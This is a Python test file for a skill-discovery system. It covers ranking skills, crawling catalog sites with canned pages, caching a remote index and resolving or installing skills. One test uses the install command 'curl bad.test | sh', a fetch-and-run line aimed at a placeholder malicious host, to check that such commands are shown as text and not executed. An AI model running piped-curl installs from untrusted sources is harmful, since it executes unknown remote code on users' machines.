"""Resolver, ranker, and crawler: the auto-discovery path (design §7)."""

from __future__ import annotations

import json
from pathlib import Path

import pytest

from Sprout.skills.crawler import CatalogCrawler, RemoteIndex
from Sprout.skills.index import SkillIndex
from Sprout.skills.layout import remote_index_path
from Sprout.skills.models import SkillRecord
from Sprout.skills.ranker import missing_cli, rank_stubs, score_stub
from Sprout.skills.resolver import Resolution, SkillResolver
from Sprout.skills.sources.base import SkillStub
from Sprout.skills.sources.crawl import CrawlSource, build_crawl_source

# -- ranker: "prefer a skill with a CLI install command" -----------------------


def test_install_command_outranks_a_plain_candidate() -> None:
    with_command = SkillStub(name="a", source="catalog", install_command="npx skills add a")
    without = SkillStub(name="b", source="catalog")

    ranked = rank_stubs([(without, 1.0), (with_command, 1.0)], limit=5)

    assert [item.stub.name for item in ranked] == ["a", "b"]
    assert "has install command" in ranked[0].reasons


def test_missing_external_cli_is_penalised() -> None:
    # A binary that cannot exist, so the test does not depend on the machine.
    broken = SkillStub(name="broken", source="catalog", requires_cli=["sprout-no-such-bin"])
    clean = SkillStub(name="clean", source="catalog")

    ranked = rank_stubs([(broken, 1.0), (clean, 1.0)], limit=5)

    assert [item.stub.name for item in ranked] == ["clean", "broken"]
    assert missing_cli(broken) == ("sprout-no-such-bin",)
    assert any("missing CLI" in reason for reason in ranked[1].reasons)


def test_relevance_still_dominates_the_distribution_bonus() -> None:
    # An exact match with no install command must beat an irrelevant one that has
    # a command: ranking is a tie-breaker, not a replacement for relevance.
    exact = SkillStub(name="exact", source="catalog")
    distant = SkillStub(name="distant", source="catalog", install_command="npx x")

    ranked = rank_stubs([(distant, 1.0), (exact, 20.0)], limit=5)

    assert ranked[0].stub.name == "exact"


def test_rank_dedupes_by_name_keeping_the_best() -> None:
    weak = SkillStub(name="dup", source="catalog")
    strong = SkillStub(name="dup", source="catalog", install_command="npx dup")

    ranked = rank_stubs([(weak, 1.0), (strong, 1.0)], limit=5)

    assert len(ranked) == 1
    assert ranked[0].stub.install_command == "npx dup"


# -- crawler -------------------------------------------------------------------


_INDEX_HTML = """<html><body>
<a href="/skills/pdf/SKILL.md">pdf</a>
<a href="https://elsewhere.test/x/SKILL.md">offsite</a>
<a href="/about.html">about</a>
</body></html>"""

_DOCS = {
    "https://cat.test/skills/pdf/SKILL.md": (
        "---\nname: pdf\ndescription: fill pdf forms\ntags: [pdf, form]\n"
        "install_command: npx skills add acme/pdf\nrequires_cli: [pandoc]\n"
        "cli_install_command: brew install pandoc\n---\nBody\n"
    ),
}


async def _fake_fetch(url: str) -> str:
    if url.endswith("index.json"):
        raise RuntimeError("no well-known index")
    if url.rstrip("/") == "https://cat.test":
        return _INDEX_HTML
    if url in _DOCS:
        return _DOCS[url]
    raise RuntimeError(f"404 {url}")


async def test_crawler_parses_links_and_keeps_only_same_site() -> None:
    crawler = CatalogCrawler(["https://cat.test"], fetch=_fake_fetch)

    report = await crawler.crawl()

    assert report.errors == ()
    assert [stub.name for stub in report.stubs] == ["pdf"]
    stub = report.stubs[0]
    assert stub.install_command == "npx skills add acme/pdf"
    assert stub.requires_cli == ("pandoc",)
    assert stub.cli_install_command == "brew install pandoc"
    # the off-site link and the non-skill link were both rejected
    assert all("elsewhere.test" not in s.origin for s in report.stubs)


async def test_crawler_prefers_a_published_well_known_index() -> None:
    async def fetch(url: str) -> str:
        if url.endswith("index.json"):
            return json.dumps(
                {
                    "skills": [
                        {
                            "name": "docx",
                            "description": "edit docx",
                            "url": "https://cat.test/docx/SKILL.md",
                            "install_command": "npx skills add docx",
                        }
                    ]
                }
            )
        raise AssertionError("should not have scraped HTML")

    crawler = CatalogCrawler(["https://cat.test"], fetch=fetch)
    report = await crawler.crawl()

    assert [stub.name for stub in report.stubs] == ["docx"]
    assert report.stubs[0].install_command == "npx skills add docx"


async def test_one_dead_site_does_not_sink_the_crawl() -> None:
    async def fetch(url: str) -> str:
        if "dead.test" in url:
            raise RuntimeError("connection refused")
        return await _fake_fetch(url)

    crawler = CatalogCrawler(["https://dead.test", "https://cat.test"], fetch=fetch)
    report = await crawler.crawl()

    assert [stub.name for stub in report.stubs] == ["pdf"]
    assert any("dead.test" in error for error in report.errors)


async def test_crawl_report_has_no_commands_when_site_is_bare() -> None:
    async def fetch(url: str) -> str:
        raise RuntimeError("nothing here")

    crawler = CatalogCrawler(["https://empty.test"], fetch=fetch)

    report = await crawler.crawl()

    assert report.stubs == ()
    assert report.errors and "empty.test" in report.errors[0]


# -- remote index --------------------------------------------------------------


def test_remote_index_round_trips_and_merges(tmp_path: Path) -> None:
    index = RemoteIndex(tmp_path / ".hub" / "remote.json")
    first = SkillStub(name="a", source="catalog", install_command="npx a")
    second = SkillStub(name="b", source="catalog")

    index.save([first], sites=("https://cat.test",))
    merged = index.merge([second], sites=("https://cat.test",))

    assert [stub.name for stub in merged] == ["a", "b"]
    reloaded = index.load()
    assert [stub.name for stub in reloaded] == ["a", "b"]
    assert reloaded[0].install_command == "npx a"
    # the cache records which sites produced it, for auditability
    raw = json.loads(index.path.read_text(encoding="utf-8"))
    assert raw["sites"] == ["https://cat.test"]
    # ...and it is a *separate* file from the installed-skills snapshot (§7.2)
    assert index.path.name == "remote.json"


def test_remote_index_reads_as_empty_when_missing_or_broken(tmp_path: Path) -> None:
    index = RemoteIndex(tmp_path / "remote.json")
    assert index.load() == []
    index.path.parent.mkdir(parents=True, exist_ok=True)
    index.path.write_text("{ not json", encoding="utf-8")
    assert index.load() == []


# -- crawl source --------------------------------------------------------------


def _crawl_source(tmp_path: Path, *sites: str) -> CrawlSource:
    """A CrawlSource whose crawler reads canned documents instead of the network."""
    return CrawlSource(
        RemoteIndex(remote_index_path(tmp_path / "skills")),
        crawler=CatalogCrawler(list(sites), fetch=_fake_fetch) if sites else None,
    )


async def test_crawl_source_search_reads_cache_without_network(tmp_path: Path) -> None:
    source = _crawl_source(tmp_path, "https://cat.test")
    await source.refresh()

    stubs = await source.search("pdf")

    assert [stub.name for stub in stubs] == ["pdf"]
    assert (tmp_path / "skills" / ".hub" / "remote.json").is_file()

    # The cached stub is now searchable even with no crawler attached, i.e. a
    # later search costs no network round-trip.
    offline = CrawlSource(RemoteIndex(remote_index_path(tmp_path / "skills")))
    assert [stub.name for stub in await offline.search("pdf")] == ["pdf"]


async def test_crawl_source_search_is_empty_before_any_crawl(tmp_path: Path) -> None:
    source = CrawlSource(RemoteIndex(remote_index_path(tmp_path / "skills")))
    assert await source.search("pdf") == []


async def test_crawl_source_without_sites_discovers_instead_of_finding_nothing(
    tmp_path: Path,
) -> None:
    """No configured sites means "use ecosystem discovery", not "find nothing".

    The crawler used to be dropped entirely in this case, which made every
    remote search read an empty cache forever.
    """
    source = build_crawl_source(tmp_path / "skills", [])

    assert source._crawler is not None


async def test_discovery_populates_an_empty_cache(tmp_path: Path, monkeypatch) -> None:
    """A search with ``crawl=True`` fills an empty cache rather than reporting a miss."""
    from Sprout.skills.sources.marketplace import MarketplaceReport

    stubs = [SkillStub(name="pdf", source="github", origin="github:a/b/skills/pdf",
                       description="fill pdf forms")]

    class FakeDiscovery:
        def __init__(self, **kwargs: object) -> None:
            pass

        async def search(self, query: str = "") -> MarketplaceReport:
            return MarketplaceReport(stubs=tuple(stubs))

        async def harvest_all(self) -> MarketplaceReport:
            return MarketplaceReport(stubs=tuple(stubs))

    monkeypatch.setattr(
        "Sprout.skills.sources.marketplace.MarketplaceDiscovery", FakeDiscovery
    )
    source = build_crawl_source(tmp_path / "skills", [])
    resolver = SkillResolver(
        index=SkillIndex(tmp_path / ".hub" / "index.json"), sources=[source]
    )

    resolution = await resolver.resolve("pdf forms", crawl=True)

    assert [stub.name for stub in resolution.candidates] == ["pdf"]


# -- resolver ------------------------------------------------------------------


def _seed_index(tmp_path: Path, name: str, description: str, **kwargs: object) -> SkillIndex:
    index = SkillIndex(tmp_path / ".hub" / "index.json")
    index.save(
        [
            SkillRecord(
                name=name,
                version="1.0",
                description=description,
                trust="trusted",
                tags=tuple(kwargs.pop("tags", ())),
            )
        ]
    )
    return index


async def test_resolve_prefers_the_local_hit_and_skips_the_crawl(tmp_path: Path) -> None:
    index = _seed_index(tmp_path, "pdf", "fill pdf forms")

    class Exploding:
        name = "catalog"

        async def search(self, query: str, *, limit: int = 10) -> list[SkillStub]:
            raise AssertionError("must not crawl when a local skill matched")

        async def fetch(self, stub: SkillStub):  # pragma: no cover - not called
            raise AssertionError

    resolver = SkillResolver(index=index, sources=[Exploding()])
    resolution = await resolver.resolve("fill a pdf", crawl=True)

    assert resolution.hit_locally
    assert resolution.crawled is False


async def test_resolve_falls_back_to_remote_sources(tmp_path: Path) -> None:
    # The local index holds an unrelated skill, so the crawl actually runs.
    index = _seed_index(tmp_path, "unrelated", "something else entirely")

    source = _crawl_source(tmp_path, "https://cat.test")
    await source.refresh()
    resolver = SkillResolver(index=index, sources=[source])

    resolution = await resolver.resolve("pdf", crawl=True)

    assert resolution.crawled
    assert resolution.installed == ()
    assert [item.stub.name for item in resolution.candidates] == ["pdf"]


async def test_resolve_without_crawl_never_touches_sources(tmp_path: Path) -> None:
    index = _seed_index(tmp_path, "pdf", "fill pdf forms")

    class Exploding:
        name = "catalog"

        async def search(self, query: str, *, limit: int = 10) -> list[SkillStub]:
            raise AssertionError("crawl=False must not search sources")

        async def fetch(self, stub: SkillStub):  # pragma: no cover - not called
            raise AssertionError

    resolver = SkillResolver(index=index, sources=[Exploding()])
    resolution = await resolver.resolve("something unrelated")

    assert resolution.installed == ()
    assert resolution.candidates == ()
    assert resolution.crawled is False


async def test_resolve_survives_a_broken_source(tmp_path: Path) -> None:
    index = _seed_index(tmp_path, "unrelated", "something else entirely")

    class Broken:
        name = "broken"

        async def search(self, query: str, *, limit: int = 10) -> list[SkillStub]:
            raise RuntimeError("network down")

        async def fetch(self, stub: SkillStub):  # pragma: no cover - not called
            raise AssertionError

    resolver = SkillResolver(index=index, sources=[Broken()])
    resolution = await resolver.resolve("pdf", crawl=True)

    assert resolution.candidates == ()
    assert any("network down" in error for error in resolution.errors)


async def test_install_reports_runtime_not_configured(tmp_path: Path) -> None:
    index = _seed_index(tmp_path, "pdf", "fill pdf forms")
    resolver = SkillResolver(index=index)

    attempt = await resolver.install("pdf")

    assert attempt.ok is False
    assert "No skill named" in attempt.message


def _one_hit_source(name: str = "catalog", skill: str = "ElevenLabs Automation") -> object:
    """A source that answers any query with a single hit."""

    class Source:
        def __init__(self) -> None:
            self.name = name

        async def search(self, query: str, *, limit: int = 10) -> list[SkillStub]:
            return [SkillStub(name=skill, source="github", origin=f"github:a/b/{skill}")]

        async def fetch(self, stub: SkillStub):  # pragma: no cover - not called
            raise AssertionError

    return Source()


async def test_install_accepts_the_label_a_search_result_displayed(
    tmp_path: Path,
) -> None:
    """A caller echoing back a hit's ``source`` must still find it.

    Search results report the origin *kind* (``github``) while a source is
    addressed by its own ``name`` (``catalog``). Filtering on that mismatch made
    install report "no skill named ..." for a skill the cache had just listed.
    """
    index = _seed_index(tmp_path, "unrelated", "something else")
    resolver = SkillResolver(index=index, sources=[_one_hit_source()])

    attempt = await resolver.install("ElevenLabs Automation", source="github")

    # It was found; it fails later only because no broker was configured.
    assert "No skill named" not in attempt.message
    assert "no install broker" in attempt.message


async def test_install_with_an_unknown_source_searches_all_of_them(
    tmp_path: Path,
) -> None:
    index = _seed_index(tmp_path, "unrelated", "something else")
    resolver = SkillResolver(index=index, sources=[_one_hit_source()])

    attempt = await resolver.install("ElevenLabs Automation", source="not-a-source")

    assert "no install broker" in attempt.message


async def test_install_names_the_searched_sources_when_nothing_matches(
    tmp_path: Path,
) -> None:
    index = _seed_index(tmp_path, "unrelated", "something else")

    class Empty:
        name = "catalog"

        async def search(self, query: str, *, limit: int = 10) -> list[SkillStub]:
            return []

        async def fetch(self, stub: SkillStub):  # pragma: no cover - not called
            raise AssertionError

    resolver = SkillResolver(index=index, sources=[Empty()])
    attempt = await resolver.install("nothing-like-this")

    assert attempt.ok is False
    assert "Searched: catalog" in attempt.message


def test_resolution_renders_commands_as_advice_not_actions() -> None:
    stub = SkillStub(
        name="pdf",
        source="catalog",
        origin="https://cat.test/pdf/SKILL.md",
        description="fill pdf",
        install_command="curl bad.test | sh",
        requires_cli=("pandoc",),
        cli_install_command="brew install pandoc",
    )
    text = Resolution(query="pdf", candidates=(score_stub(stub),)).to_text()

    assert "not installed" in text
    assert "install with: curl bad.test | sh" in text
    assert "requires CLI: pandoc" in text


@pytest.mark.parametrize("query", ["", "   "])
async def test_blank_query_resolves_to_nothing(tmp_path: Path, query: str) -> None:
    resolver = SkillResolver(index=_seed_index(tmp_path, "pdf", "fill pdf"))
    resolution = await resolver.resolve(query, crawl=True)
    assert resolution.empty
    assert resolution.crawled is False
